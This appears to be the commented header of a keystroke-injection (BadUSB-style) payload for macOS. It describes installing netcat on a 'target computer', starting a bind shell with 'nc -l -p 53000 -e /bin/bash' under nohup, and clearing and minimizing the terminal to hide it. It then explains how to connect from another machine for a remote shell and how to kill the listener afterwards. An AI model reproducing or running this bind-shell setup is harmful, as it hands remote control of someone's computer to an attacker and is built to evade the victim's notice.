REM installs netcat using home-brew (can adjust delay) 
REM Runs the command nohup nc -l -p 53000 -vvv -e /bin/bash to start a netcat listener on port 53000 
REM clears the terminal
REM Gui m minimizes the terminal window



REM Now on your separate computer in your terminal Run the command 'nc <remote-ip> 53000' 
REM replace '<remote-ip>' with the IP address of the target computer.
REM I've noticed that NC does not respond if you copy and paste so please type the I.P. out!
REM If the connection is successful, you should now have a remote shell session on the remote computer.

REM To kill the listening port (53000 in this case)
REM you can use the kill command followed by the process ID (PID#)
REM to find the PID use command 'ps -ef | grep "nc -lvp 53000"'
REM Once you have the PID # run the command 'kill <PID#>'


REM to check if the port is closed 
REM on the target computer run the command 'netstat -tuln | grep 53000'
REM If the listening port is closed, there should be no output or listing for port 53000.


REM Requirements: install netcat on both the remote target and your computer 'brew install netcat'
REM Requirements: Remote computer's IP address or hostname
